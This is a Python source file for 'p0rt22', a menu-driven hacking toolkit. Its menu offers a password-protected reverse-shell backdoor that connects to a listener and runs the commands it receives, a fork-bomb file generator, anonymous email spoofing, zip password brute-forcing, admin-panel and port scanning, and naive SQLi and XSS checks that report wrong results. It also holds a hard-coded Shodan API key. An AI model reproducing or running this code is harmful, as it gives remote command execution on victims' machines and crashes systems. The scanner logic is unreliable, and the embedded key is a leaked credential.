#!/usr/bin/python

try: 
	import os, sys, mechanize, socket, subprocess, itertools, shodan, random, string, getpass, urllib2
	from pygeoip import GeoIP
	from zipfile import ZipFile 
	from six.moves import urllib

	def clear():
		os.system('clear')

	clear()

	def pause():
		getpass.getpass('')
	# makes clear and pause functions for convienience

	escape = '\033[1;m'
	blue = '\033[1;34m'
	cyan = '\033[1;36m'
	green = '\033[1;32m'
	grey = '\033[1;30m'
	magenta = '\033[1;35m'
	red = '\033[1;31m'
	white = '\033[1;37m'
	yellow = '\033[1;33m'
	# colours

	hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
'Accept-Encoding': 'none',
'Accept-Language': 'en-US,en;q=0.8',
'Connection': 'keep-alive'}
	# headers for mechanize

	tou = red + 'This tool is capable of causing damage to computers, computer networks, and the operators thereof. This tool was created for educational purposes. Illegal use of this tool and its variants is not encouraged by its author. The end-user is solely responsible for any use(legal or illegal) of this tool and/or its variants. By using this tool, you accept the reponsibity of ethical use.\n' + escape
	if os.path.isfile('first_use.txt') == True:
		pass

	else:
		print tou
		firstUse = open('first_use.txt', 'w')
		firstUse.write('True')
		pause()
	# makes sure user knows terms of use

	def banner():
		print cyan + '''
@@@@@@@      @@@@@@@@     @@@@@@@ 
@@!  @@@     @@!            @!!   
@!@@!@!      @!!!:!         @!!   
!!:      !:! !!:      !:!   !!:   
 :       ::: : :: ::  :::    :      
\nBy: https://github.com/p0rt22\n''' + escape
	
	banner()
	# prints banner

	def credits():
		print red + '''@coaxl.p2
@v1thegod
@_t0x1c
''' + escape
	
	credits()
	# p0rt22 team / credits
	
	def adminScanner(url):
		try:
			clear()
			panels = []
			if 'http' in url:
				pass

			else:
				url = 'http://{}'.format(url)
			# makes url readable by urllib

			if urllib.request.urlopen(url).getcode() != 200:
				clear()
				print 'Invalid URL'
				pause()
				main()
			# checks to see if URL is valid

			print 'Scanning... '
			with open('adminList.txt') as wList:
				for line in wList:
					currentUrl = '{}/{}'.format(url, line)
					try:
						req = urllib.request.Request(currentUrl, headers=hdr)
						body = urllib.request.urlopen(req).read()
						fullBody = body.decode('utf-8')
						if 'password' in fullBody.lower():
							panels.append(currentUrl)
							print currentUrl
						# tests all directories in list

					except urllib2.URLError:
						pass

			if len(panels) == 0:
				clear()
				print 'No panels found'
				pause()
				main()
			# checks if anything was found during scan

			else:
				pass

			print '\nDone'
			pause()
			main()

		except ValueError:
			clear()
			print 'Invalid URL'
			pause()
			main()

		except urllib2.URLError:
			clear()
			print 'Invalid URL'
			pause()
			main()

	def anonymousEmail(to, subject, message):
		br = mechanize.Browser()
		url = 'http://anonymouse.org/anonemail.html'
		headers = 'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)'
		br.addheaders = [('User-agent', headers)]
		br.open(url)
		br.set_handle_equiv(True)
		br.set_handle_gzip(True)
		br.set_handle_redirect(True)
		br.set_handle_referer(True)
		br.set_handle_robots(False)
		br.set_debug_http(False)
		br.set_debug_redirects(False)

		br.select_form(nr=0)

		br.form['to'] = to
		br.form['subject'] = subject
		br.form['text'] = message

		result = br.submit()
		response = br.response().read()
		# fills all the forms on the website

		if 'The e-mail has been sent anonymously!' in response:
			print 'Success, the email will be sent shortly'
			pause()
			main()

		else:
			print 'Email failed to send'
			pause()
			main()
		# checks response from website
	
	def dropBackdoor(ip, port, passwd):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, int(port)))
			# connects to listener

			while True:
				s.send('Password: ')
				pwd = s.recv(1024)

				if pwd.strip() != passwd:
					pass
				
				else:
					s.send(':kill to end shell\n')
					s.send('Connected #> ')
					break
				# checks to see if entered password from listener is correct

			while True:
				data = s.recv(1024)

				if data.strip() == ":kill":
					clear()
					s.close()
					sys.exit()

				proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = proc.stdout.read() + proc.stderr.read()
				s.send(output)
				s.send("#> ")
				# reads the entered command, executes it, and sends it back to listener

		except socket.gaierror:
			print 'Unable to connect to listener'
			main()

	def forkBomb(name):
		fBomb = open(name, 'w')
		fBomb.write('''#!/usr/bin/python
import os
while True:
	os.system('x-terminal-emulator -e /usr/bin/python ' + __file__)
			''')
		os.system('chmod +x {}'.format(name))
		clear()
		print 'Forkbomb successfully created as {}'.format(name)
		pause()
		main()

	def traceIP(target):
		try:
			base = GeoIP('GeoLiteCity.dat')
			data = base.record_by_addr(target)
			dnsName = socket.gethostbyaddr(target)[0]
			formatedData = '''IP: {}
City: {}
State/Province: {}
Country: {}
Continent: {}
Zip/Postal code: {}
Timezone: {}
Latitude: {}
Longitude: {}
DNS name: {}'''.format(target, data['city'], data['region_code'], data['country_name'], data['continent'], data['postal_code'], data['time_zone'], str(data['latitude']), str(data['longitude']), dnsName)
			print formatedData
			# compares target to database and print results to console
			
			askSave = raw_input('Save data? Y/n: ').lower()
			if askSave == 'y':
				ipFileName = raw_input('Filename: ')
				
				with open(ipFileName, 'w') as fileName:
					fileName.write(formatedData)

				print 'Output saved as {}'.format(ipFileName)

			else:
				pass
			# asks user if they want to save the output

			pause()
			main()

		except socket.herror:
			pass

	def genPass(length):
		try:
			chars = string.ascii_letters + string.digits + '!@#$%^&*()'
			ranPass = (''.join(random.choice(chars) for num in range(int(length))))
			# creates list of characters for password and then string them together

			print ranPass
			pause()
			main()

		except ValueError:
			print 'Invalid length'
			pause()
			main()

		except (MemoryError, OverflowError):
			print 'Length to large'
			pause()
			main()

	def pScan(target, start, end):
		print 'Scanning {}... '.format(target)
		for port in range(start, end + 1):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = s.connect_ex((target, port))
		
			if result == 0:
				print 'Port {}:      Open'.format(port)

			else:
				print 'Port {}:      Closed'.format(port)

		print '\nDone'
		pause()
		main()

	def shodanSearch(query):
		try:
			api = shodan.Shodan('7Kgx2Ly9o6YvFZhQNmn3P1rCwtH3SOWM')
			results = api.search(query)
			pages = results['total']/100
			# searches entered query using p0rt22 api

			if results['total']%100 > 0:
				pages += 1

			for result in results['matches']:
				print 'IP: {}'.format(result['ip_str'])
			# prints results

			print '\nDone'
			pause()
			main()

		except UnboundLocalError:
			print 'Invalid search query'
			pause()
			main()

		except shodan.APIError:
			print 'Error'
			pause()
			main()

	def sqliScanner(url):
		try:
			body = urllib.request.urlopen(url).read()
			fullBody = body.decode('utf-8')

			if 'warning' in fullBody.lower():
				print '{} is vulnerable to an SQL injection'.format(url)
				pause()
				main()

			elif 'error' in fullBody.lower():
				print '{} is vulnerable to an SQL injection'.format(url)
				pause()
				main()

			else:
				print '{} is not vulnerable to an SQL injection'.format(url)
				pause()
				main()
			# checks page for SQL error

		except (ValueError, urllib2.URLError):
			print 'Invalid URL'
			pause()
			main()

	def wordlistGen(charset, minLen, maxLen, fName):
		with open(fName, 'w') as wordlist:
			for length in range(int(minLen), int(maxLen) + 1):
				for xs in itertools.product(charset, repeat=length):
					word = "".join(xs)
					wordlist.write('{}\n'.format(word))

		print 'Done'
		pause()
		main()

	def xssScanner(url):
		try:
			req = urllib.request.Request(url, headers = hdr)
			resp = urllib.request.urlopen(req)

			if resp.info().getheader('x-xss-protection') == '1; mode=block':
				print '{} is not vulnerable to an XSS attack'.format(url)

			else:
				print '{} is vulnerable to an XSS attack'.format(url)
			# checks if url has xss protection

			pause()
			main()

		except ValueError:
			print 'Invalid URL'
			pause()
			main()
		# checks if url is valid

	def zipBrute(file, wList):
		try:
			with open(wList) as wList:
				for word in wList:
					word = word.strip()

					try:
						file.extractall(pwd = word)
						clear()
						print 'Password found: {}'.format(word)
						pause()
						main()

					except RuntimeError:
						print 'Password failed: {}'.format(word)
					# tests password on zipfile and outputs result to console

			print 'Unable to find password'
			pause()
			main()

		except:
			print 'Error'
			pause()
			main()

	def main():
		print green + '''(0) Exit
(1) Clear
(2) Banner
(3) Credits
(4) Terms of use
(5) Admin panel scanner
(6) Anonymous email sender
(7) Drop a backdoor
(8) Generate fork bomb
(9) Trace IP address
(10) Password generator
(11) Port scanner
(12) Shodan search
(13) SQLi scanner
(14) Wordlist generator
(15) XSS Scanner
(16) Zipfile bruteforce
'''
		choice = raw_input('#> ')

		if choice == '0':
			print escape
			clear()
			sys.exit()

		elif choice == '1':
			clear()
			main()

		elif choice == '2':
			clear()
			banner()
			main()

		elif choice == '3':
			clear()
			credits()
			main()

		elif choice == '4':
			clear()
			print tou
			main()

		elif choice == '5':
			clear()
			target = raw_input('Target: ')
			adminScanner(target)

		elif choice == '6':
			clear()
			message = ''
			target = raw_input('To address: ')
			if '@' not in target:
				clear()
				print 'Invalid email address'
				pause()
				main()

			subject = raw_input('Subject: ')
			while True:
				line = raw_input('Message (enter break on a new line to end): ')
				if line.lower() == 'break':
					break

				else:
					message = '{}\n{}'.format(message, line)

			clear()
			anonymousEmail(target, subject, message)

		elif choice == '7':
			try:
				clear()
				listener = raw_input('Listener: ')
				port = raw_input('Port: ')
				port == int(port)
				passwd = raw_input('Password: ')
				clear()
				dropBackdoor(listener, port, passwd)

			except ValueError:
				clear()
				print 'Invalid port'
				pause()
				main()

		elif choice == '8':
			clear()
			fName = raw_input('File name: ')
			clear()
			forkBomb(fName)

		elif choice == '9':
			clear()
			ipAddr = raw_input('IP address: ')
			clear()
			traceIP(ipAddr)

		elif choice == '10':
			clear()
			length = raw_input('Length of password: ')
			clear()
			genPass(length)

		elif choice == '11':
			try:
				clear()
				target = raw_input('Target: ')
				target = socket.gethostbyname(target)
				start = int(raw_input('Starting port: '))
				end = int(raw_input('Ending port: '))
				clear()
				pScan(target, start, end)

			except socket.gaierror:
				clear()
				print 'Invalid target'
				pause()
				main()

			except ValueError:
				clear()
				print 'Invalid port'
				pause()
				main()

		elif choice == '12':
			clear()
			term = raw_input('Search: ')
			clear()
			shodanSearch(term)

		elif choice == '13':
			clear()
			target = raw_input('URL: ')
			if 'http' in target:
				pass
			
			else:
				target = 'http://{}'.format(target)

			target = "{}'".format(target)
			clear()
			sqliScanner(target)

		elif choice == '14':
			clear()
			print '\nCharset: '
			print '(1) {}'.format(string.digits)
			print '(2) {}'.format(string.ascii_letters)
			print '(3) {}{}'.format(string.ascii_letters, string.digits)
			print '(4) {}{}!@#$%^&*()'.format(string.ascii_letters, string.digits)
			print '(5) Custom'
			charset = raw_input('#> ')

			if charset == '1':
				charset = string.digits

			elif charset == '2':
				charset = string.ascii_letters

			elif charset == '3':
				charset = string.ascii_letters + string.digits

			elif charset == '4':
				charset = '{}{}!@#$%^&*()'.format(string.ascii_letters, string.digits)

			elif charset == '5':	
				charset = raw_input('Charset: ')

			else:
				clear()
				print 'Invalid argument'
				pause()
				main()

			minLen = raw_input('Minimum length: ')
			maxLen = raw_input('Maximum length: ')
			wordlistName = raw_input('Wordlist name: ')

			clear()
			wordlistGen(charset, minLen, maxLen, wordlistName)

		elif choice == '15':
			clear()
			target = raw_input('URL: ')
			if 'http' in target:
				pass

			else:
				target = 'http://{}'.format(target)

			clear()
			xssScanner(target)

		elif choice == '16':
			try:
				clear()
				zipName = raw_input('Zipfile name: ')
				wList = raw_input('Wordlist: ')
				zipFile = ZipFile(zipName)

				clear()
				zipBrute(zipFile, wList)

			except IOError:
				clear()
				print 'Invalid zipfile'
				pause()
				main()

		else:
			clear()
			print 'Invalid argument\n'

		main()

	main()

except ImportError:
	import sys, getpass
	print 'Missing requirements, run install.py'
	sys.exit()

except KeyboardInterrupt:
	print escape
	sys.exit()

except EOFError:
	print escape
	sys.exit()
